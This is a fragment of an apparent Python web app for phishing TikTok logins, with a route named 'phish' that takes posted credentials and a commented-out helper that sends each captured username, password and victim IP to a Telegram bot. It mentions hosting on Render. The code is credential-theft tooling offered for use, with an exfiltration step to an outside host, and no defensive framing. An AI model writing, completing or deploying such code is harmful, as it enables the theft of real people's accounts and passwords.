...
def phish():
    ...
    if request.method == 'POST':
        ...
        # Optional: Send notification via Telegram (uncomment and add bot token)
        # send_telegram_alert(creds)
...
# -----------------------------------------------------------------------------
# Optional: Telegram Notification (Configure if needed)
# -----------------------------------------------------------------------------
# def send_telegram_alert(creds):
#     bot_token = "YOUR_BOT_TOKEN"
#     chat_id = "YOUR_CHAT_ID"
#     message = f"🔐 New TikTok capture!\n👤 @{creds['username']}\n🔑 {creds['password']}\n🌐 {creds['ip']}"
#     url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
#     requests.post(url, json={"chat_id": chat_id, "text": message})

# -----------------------------------------------------------------------------
# Run the App (for local testing or Render)
# -----------------------------------------------------------------------------
